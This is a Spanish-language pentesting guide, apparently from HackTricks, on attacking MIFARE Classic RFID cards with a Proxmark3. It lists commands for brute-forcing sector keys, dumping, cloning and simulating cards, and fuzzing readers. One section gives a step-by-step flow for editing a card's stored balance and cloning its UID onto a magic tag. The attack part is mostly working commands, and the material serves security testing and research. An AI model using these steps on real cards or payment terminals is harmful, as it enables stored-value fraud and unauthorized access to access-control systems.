# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacar sistemas RFID con Proxmark3

Lo primero que necesitas es tener un [**Proxmark3**](https://proxmark.com) y [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacar MIFARE Classic 1KB

Tiene **16 sectores**, cada uno de ellos tiene **4 bloques** y cada bloque contiene **16B**. El UID está en sector 0 block 0 (y no puede ser alterado).\
Para acceder a cada sector necesitas **2 keys** (**A** and **B**) que se almacenan en **block 3 of each sector** (sector trailer). El sector trailer también almacena los **access bits** que dan los permisos de **read and write** sobre **cada bloque** usando las 2 keys.\
Tener 2 keys es útil para dar permisos de lectura si conoces la primera y de escritura si conoces la segunda (por ejemplo).

Se pueden realizar varios ataques
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
El Proxmark3 permite realizar otras acciones, como **eavesdropping** de una **Tag to Reader communication**, para intentar encontrar datos sensibles. En esta tarjeta podrías simplemente sniff la comunicación y calcular la clave usada porque las **operaciones criptográficas utilizadas son débiles** y, conociendo el texto plano y el texto cifrado, puedes calcularla (`mfkey64` tool).

#### MiFare Classic flujo rápido para el abuso de valor almacenado

Cuando los terminales almacenan saldos en tarjetas Classic, un flujo típico de extremo a extremo es:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orquesta ataques estilo nested/darkside/HardNested, recupera keys y crea dumps en la client dumps folder.
- Escribir block 0/UID solo funciona en tarjetas magic gen1a/gen2. Las tarjetas Classic normales tienen UID de solo lectura.
- Muchas implementaciones usan Classic "value blocks" o simple checksums. Asegúrate de que todos los campos duplicados/complementados y los checksums sean consistentes después de editar.

Consulta una metodología de mayor nivel y mitigaciones en:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandos RAW

Los sistemas IoT a veces usan **nonbranded or noncommercial tags**. En este caso, puedes usar Proxmark3 para enviar custom **raw commands to the tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con esta información podrías intentar buscar información sobre la tarjeta y sobre la forma de comunicarte con ella. Proxmark3 permite enviar comandos raw como: `hf 14a raw -p -b 7 26`

### Scripts

El software Proxmark3 incluye una lista preinstalada de **scripts de automatización** que puedes usar para realizar tareas simples. Para obtener la lista completa, usa el comando `script list`. Luego, usa el comando `script run`, seguido del nombre del script:
```
proxmark3> script run mfkeys
```
Puedes crear un script para **fuzz tag readers**: si copias los datos de una **valid card**, basta con escribir un **Lua script** que **randomize** uno o más **bytes** aleatorios y comprobar si el **reader crashes** en alguna iteración.

## Referencias

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
